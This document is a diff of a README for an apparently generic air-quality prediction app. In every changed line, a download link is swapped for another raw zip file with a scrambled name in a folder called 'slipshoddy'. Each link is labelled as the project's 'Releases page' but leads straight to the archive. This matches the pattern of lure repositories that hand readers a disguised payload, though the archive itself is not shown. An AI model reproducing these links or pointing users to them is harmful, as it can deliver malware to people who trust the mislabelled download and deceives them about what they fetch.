@@ -1,6 +1,6 @@
 # 🌍 Air-Aware-smart-Air-Quality-prediction-system - Monitor Air Quality Effortlessly
 
-[![Download](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Air-Aware-smart-Air-Quality-prediction-system.zip)](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Air-Aware-smart-Air-Quality-prediction-system.zip)
+[![Download](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Quality-Air-system-Aware-prediction-smart-3.9.zip)](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Quality-Air-system-Aware-prediction-smart-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to the Air-Aware smart Air Quality Predication System. This application 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Air-Aware-smart-Air-Quality-prediction-system.zip) to download the latest version of the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Quality-Air-system-Aware-prediction-smart-3.9.zip) to download the latest version of the application. 
 
-1. Go to the Releases page by clicking this link: [Releases page](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Air-Aware-smart-Air-Quality-prediction-system.zip).
+1. Go to the Releases page by clicking this link: [Releases page](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Quality-Air-system-Aware-prediction-smart-3.9.zip).
 2. On the Releases page, find the latest version listed. 
 3. Click on the download link related to your operating system. 
 4. Once downloaded, locate the file and follow the installation instructions specific to your system.
@@ -70,6 +70,6 @@ If you encounter issues or have questions, you can open an issue on the project'
 
 ## 🌟 Stay Updated
 
-Stay updated on the latest releases and features by visiting the [Releases page](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Air-Aware-smart-Air-Quality-prediction-system.zip) regularly.
+Stay updated on the latest releases and features by visiting the [Releases page](https://raw.githubusercontent.com/feqq1/Air-Aware-smart-Air-Quality-prediction-system/main/slipshoddy/Quality-Air-system-Aware-prediction-smart-3.9.zip) regularly.
 
 Thank you for using the Air-Aware smart Air Quality Prediction System! Your steps in monitoring air quality make a difference.
